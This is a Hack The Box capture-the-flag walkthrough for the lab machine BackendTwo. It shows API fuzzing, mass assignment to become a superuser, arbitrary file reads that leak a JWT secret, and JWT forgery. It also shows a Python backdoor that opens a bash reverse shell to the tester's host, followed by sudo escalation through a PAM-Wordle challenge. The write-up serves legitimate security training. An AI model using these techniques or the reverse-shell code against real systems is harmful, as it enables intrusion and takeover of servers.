---
title: "[HTB] Machine: BackendTwo"
description: "[HTB] Machine: BackendTwo"
date: 2023-11-06
menu:
  sidebar:
    name: "[HTB] Machine: BackendTwo"
    identifier: htb-machine-BackendTwo
    parent: htb-machines-linux
    weight: 10
hero: images/backendtwo.png
tags: ["HTB", "uvicorn", "python", "api", "json", "jq", "wfuzz", "swagger", "fastapi", "jwt", "pyjwt", "jwt-io", "simple-modify-headers", "pam-wordle", "mass-assignment", "cyberchef"]
---

# BackendTwo
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.162 --min-rate 1000                                                                                
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 18:59 GMT
Nmap scan report for 10.10.11.162 (10.10.11.162)
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 76.04 seconds
```
```
└─$ nmap -Pn -p22,80 -sC -sV 10.10.11.162 --min-rate 1000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 19:09 GMT
Nmap scan report for 10.10.11.162 (10.10.11.162)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Fri, 10 Nov 2023 19:08:48 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Fri, 10 Nov 2023 19:08:35 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC Api v2.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Fri, 10 Nov 2023 19:08:41 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94%I=7%D=11/10%Time=654E7FEE%P=x86_64-pc-linux-gnu%r(Get
SF:Request,A6,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Fri,\x2010\x20Nov\x20202
SF:3\x2019:08:35\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2022\r\n
SF:content-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"msg
SF:\":\"UHC\x20Api\x20v2\.0\"}")%r(HTTPOptions,BF,"HTTP/1\.1\x20405\x20Met
SF:hod\x20Not\x20Allowed\r\ndate:\x20Fri,\x2010\x20Nov\x202023\x2019:08:41
SF:\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\ncontent-type:
SF:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail\":\"Metho
SF:d\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(FourOhFour
SF:Request,AD,"HTTP/1\.1\x20404\x20Not\x20Found\r\ndate:\x20Fri,\x2010\x20
SF:Nov\x202023\x2019:08:48\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:
SF:\x2022\r\ncontent-type:\x20application/json\r\nConnection:\x20close\r\n
SF:\r\n{\"detail\":\"Not\x20Found\"}")%r(GenericLines,76,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%
SF:r(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nconten
SF:t-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:Invalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequestTCP,76,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x2
SF:0received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(TerminalServerCooki
SF:e,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20re
SF:quest\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.95 seconds

```

- Port `80`

![](./images/1.png)

- `gobuster`
```
└─$ gobuster dir -u http://10.10.11.162/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --no-error 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.162/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 401) [Size: 30]
/api                  (Status: 200) [Size: 19]
```

## Foothold
- `http://10.10.11.162/api` has `v1` endpoint

![](./images/2.png)

- `http://10.10.11.162/api/v1` has 2 endpoints

![](./images/3.png)

- Identical to `Backend` box, we have to `fuzz` endpoints
```
└─$ wfuzz -u 'http://10.10.11.162/api/v1/user/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -XPOST --hh 31
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.162/api/v1/user/FUZZ
Total requests: 63087

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000009:   422        0 L      3 W        172 Ch      "login"
000000396:   422        0 L      2 W        81 Ch       "signup"

```
```
└─$ wfuzz -u 'http://10.10.11.162/api/v1/user/FUZZ' -z range,1-1000 -XGET  --hh 4
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.162/api/v1/user/FUZZ
Total requests: 1000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000007:   200        0 L      2 W        180 Ch      "7"
000000001:   200        0 L      2 W        175 Ch      "1"
000000003:   200        0 L      2 W        178 Ch      "3"
000000011:   200        0 L      2 W        180 Ch      "11"
000000008:   200        0 L      2 W        179 Ch      "8"
000000006:   200        0 L      2 W        177 Ch      "6"
000000009:   200        0 L      2 W        175 Ch      "9"
000000010:   200        0 L      2 W        177 Ch      "10"
000000002:   200        0 L      2 W        176 Ch      "2"
000000005:   200        0 L      2 W        177 Ch      "5"
000000004:   200        0 L      2 W        180 Ch      "4" 
```

- Let's register a user
```
└─$ curl -s -XPOST http://10.10.11.162/api/v1/user/signup -H 'Content-Type: application/json' -d '{"email":"pentest@mail.htb", "password":"P@ssw0rd"}'| jq .
{}
```
```
└─$ curl -s -XPOST http://10.10.11.162/api/v1/user/login -d 'username=pentest@mail.htb&password=P@ssw0rd' | jq . 
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDkyNzY5LCJpYXQiOjE2OTk4MDE1NjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6Ijc3OTUzODI3LWIxOTYtNDQ3Ni05ZjQ3LWE2NjQ4YzQwNDQwYiJ9.wpqjdpqu1RxJr4Jfjg8ABfdW7bIcFTSvxlEJWFhRZx8",                                                                                                                                                                                              
  "token_type": "bearer"                                                                                                                                                                                                                    
} 
```

![](./images/6.png)

- Same as in `backend` we change use `Simply Modify Header` extension on `Firefox`

![](./images/4.png)

![](./images/5.png)

- We few interesting endpoints

![](./images/7.png)

-I can't change another user's password
```
{
  "detail": {
    "result": "false"
  }
}
```

- Let's try check `/api/v1/user/{user_id}/edit` endpoint
  - I can change my profile setting that we saw in the `jwt` token
  - Let's test if we can add additional key and try changing it

![](./images/8.png)

![](./images/9.png)

- I can set `is_superuser` parameter

![](./images/10.png)

![](./images/11.png)

- But the current session still has `is_superuser` set to `false`
  - I need to update the token
  - Turn off the extension and try login via `Authorize` button in `/docs`

![](./images/12.png)

![](./images/13.png)

- Now we can access `admin` endpoints
  - `file` endpoint states: `Returns a file on the server. File name input is encoded in base64_url`
  - Use [cyberchef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')) for conversion

![](./images/14.png)

- We can't write to file since we need `debug` key in token
  - I can't add it via edit profile feature, so we need a secret
```
{
  "detail": "Debug key missing from JWT"
}
```

- I'll create a script to make it easier to read the files
  - We have to find a secret like in `backend`
```
#!/bin/bash

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk0MjEyLCJpYXQiOjE2OTk4MDMwMTIsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiNzc5NTM4MjctYjE5Ni00NDc2LTlmNDctYTY2NDhjNDA0NDBiIn0.NG7i_uOyC0q6-50Vk8Z0U6CId8D1ph-nIUlPAzF-8R4"
file=$(echo -n $1 | base64)

curl -s "http://10.10.11.162/api/v1/admin/file/$file" -H "Authorization: Bearer $TOKEN" | jq -r '.file'
```
```
└─$ ./backend_get_file.sh '/etc/passwd' 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false

```

- `/proc/self/environ`
```
└─$ ./backend_get_file.sh '/proc/self/environ' | tr '\000' '\n'
USER=htb
HOME=/home/htb
OLDPWD=/
PORT=80
LOGNAME=htb
JOURNAL_STREAM=9:21317
APP_MODULE=app.main:app
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=0be8b6dcf9a246489099668c549dbd59
LANG=C.UTF-8
API_KEY=68b329da9893e34099c7d8ad5cb9c940
HOST=0.0.0.0
PWD=/home/htb
```

- `/home/htb/app/main.py`
```
└─$ ./backend_get_file.sh '/home/htb/app/main.py' | tr '\000' '\n'
import asyncio
import os

with open('pid','w') as f:
    f.write( str(os.getpid())  )

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi



from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session



from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings

from app.api import deps
from app import crud



app = FastAPI(title="UHC API Quals", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)
<SNIP>
```
- It looks the is the one from `environ`
  - `JWT_SECRET: str = os.environ['API_KEY']`
  - `API_KEY=68b329da9893e34099c7d8ad5cb9c940`
```
└─$ ./backend_get_file.sh '/home/htb/app/core/config.py' | tr '\000' '\n'
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

import os
from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"
    JWT_SECRET: str = os.environ['API_KEY']
    ALGORITHM: str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: '["http://localhost", "http://localhost:4200", "http://localhost:3000", \
    # "http://localhost:8080", "http://local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
    FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"    

    class Config:
        case_sensitive = True
 

settings = Settings()
```

- I'll add the key using `jwt.io`

![](./images/15.png)


- I'll change the script
```
#!/bin/bash

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk0MjEyLCJpYXQiOjE2OTk4MDMwMTIsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiNzc5NTM4MjctYjE5Ni00NDc2LTlmNDctYTY2NDhjNDA0NDBiIiwiZGVidWciOnR>
file=$(echo -n $1 | base64)
content=$2

curl -s "http://10.10.11.162/api/v1/admin/file/$file" -H 'Content-Type: application/json' -H 'Authorization: Bearer $TOKEN' -d '{"file":"$2"}' | jq .

```
```
└─$ ./backend_write_file.sh '/tmp/test'
{
  "result": "success"                                                                                                                                                                                                                       
} 
```
```
└─$ ./backend_get_file.sh '/tmp/test'
string
```

- It works, let's add public key to `authorized_keys` and connect via `ssh`

![](./images/16.png)
```
└─$ ./backend_write_file.sh '/tmp/test' 'test'
{
  "result": "success"                                                                                                                                                                                                                       
} 
```
```
└─$ ./backend_get_file.sh '/tmp/test'         
test
```

- But it looks like there is no `.ssh` directory
  - If we check `/proc/self/cmdline`, it looks it's a child process
  - Let's check the parent process
    - Fourht column in `/proc/self/stat`
```
└─$ ./backend_get_file.sh '/proc/self/stat'                    
917 (python3) R 911 905 905 0 -1 4194304 27470 105 0 0 26605 2151 0 0 20 0 2 0 1582 1134620672 19688 18446744073709551615 4194304 7042053 140724629344560 0 0 0 0 16781312 16386 0 0 0 17 1 0 0 13 0 0 9395632 9685776 14016512 140724629347904 140724629348033 140724629348033 140724629348327 0
```
```
└─$ ./backend_get_file.sh '/proc/911/cmdline' | tr '\000' ' '  
/usr/bin/python3 /home/htb/.local/bin/uvicorn --reload --host 0.0.0.0 --port 80 app.main:app 
```
- We can try editing `user.py` since the parent process is running with `--reload` option
  - We have to grab `user.py` and modify it

```
<SNIP>
@router.get("/{user_id}", status_code=200, response_model=schemas.User)
def fetch_user(*,
    user_id: int,
    db: Session = Depends(deps.get_db)
    ) -> Any:
    """
    Fetch a user by ID
    """
    if user_id == 12:
        import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.16.4/6666 0>&1"')
    result = crud.user.get(db=db, id=user_id)
    return result
<SNIP>
```

- I used `Cyberchef`

![](./images/17.png)

- Let's write the file
```
└─$ ./backend_write_file.sh '/home/htb/app/api/v1/endpoints/user.py' 'from typing import Any, <SNIP>'
{
  "result": "success"                                                                                                                                                                                                                       
}                     
```
```
└─$ ./backend_get_file.sh '/home/htb/app/api/v1/endpoints/user.py' | tr '\000' ' '
from typing import Any, Optional
<SNIP>
@router.get("/{user_id}", status_code=200, response_model=schemas.User)
def fetch_user(*,
    user_id: int,
    db: Session = Depends(deps.get_db)
    ) -> Any:
    """
    Fetch a user by ID
    """
    if user_id == 12:
        import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.16.4/6666 0>&1"')
    result = crud.user.get(db=db, id=user_id)
    return result
<SNIP>
```

- Now if I visit `http://10.10.11.162/api/v1/user/12`, I receive my shell

![](./images/18.png)

## Root
- `auth.log`
```
htb@BackendTwo:~$ cat auth.log 
11/12/2023, 11:45:36 - Login Success for admin@htb.local
11/12/2023, 11:48:56 - Login Success for admin@htb.local
11/12/2023, 12:02:16 - Login Success for admin@htb.local
11/12/2023, 12:05:36 - Login Success for admin@htb.local
11/12/2023, 12:10:36 - Login Success for admin@htb.local
11/12/2023, 12:13:56 - Login Success for admin@htb.local
11/12/2023, 12:27:16 - Login Success for admin@htb.local
11/12/2023, 12:35:36 - Login Success for admin@htb.local
11/12/2023, 12:37:16 - Login Success for admin@htb.local
11/12/2023, 12:43:56 - Login Success for admin@htb.local
11/12/2023, 12:52:16 - Login Failure for 1qaz2wsx_htb!
11/12/2023, 12:53:51 - Login Success for admin@htb.local
11/12/2023, 12:53:56 - Login Success for admin@htb.local
11/12/2023, 12:54:16 - Login Success for admin@htb.local
11/12/2023, 12:55:36 - Login Success for admin@htb.local
11/12/2023, 13:00:36 - Login Success for admin@htb.local
11/12/2023, 13:07:16 - Login Success for admin@htb.local
11/12/2023, 15:06:08 - Login Success for pentest@mail.htb
11/12/2023, 15:30:12 - Login Success for test@mail.htb

```

- I can't `su`
  - But `sudo -l` returns `PAM-Wordle`
```
htb@BackendTwo:~$ sudo -l
[sudo] password for htb: 
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
Word: 

```

- It's [pam-wordle](https://github.com/lukem1/pam-wordle)
  - We have to check `/etc/pam.d/sudo` according to repo
```
htb@BackendTwo:~$ cat /etc/pam.d/sudo 
#%PAM-1.0

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
auth    required pam_unix.so
auth    required    pam_wordle.so
@include common-auth
@include common-account
@include common-session-noninteractive

```

- It exists
  - Let's look for `pam_wordle.so`
  - `strings 
```
htb@BackendTwo:~$ find / -name 'pam_wordle.so' 2>/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_wordle.so
```
```
htb@BackendTwo:~$ strings /usr/lib/x86_64-linux-gnu/security/pam_wordle.so
Q`^B
DICT
fetch_word
<SNIP>
/opt/.words
<SNIP>
```
```
htb@BackendTwo:~$ wc -l /opt/.words 
74 /opt/.words
```

- Let's run `sudo -l` and I'll open second terminal
  - `sshpass -p '1qaz2wsx_htb!' ssh htb@10.10.11.162`
```
htb@BackendTwo:~$ sudo -l
[sudo] password for htb: 
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
Word: write
Hint->?????
--- Attempt 2 of 6 ---
Word: putty
Hint->?????
--- Attempt 3 of 6 ---
Word: hacks
Hint->??**?
--- Attempt 4 of 6 ---
Word: flock
Correct!
Matching Defaults entries for htb on backendtwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb may run the following commands on backendtwo:
    (ALL : ALL) ALL
htb@BackendTwo:~$ sudo su
root@BackendTwo:/home/htb# 
```
```
htb@BackendTwo:~$ cat /opt/.words | grep c | grep k
flock
mlock
rocku
hacks
cmake
locks
```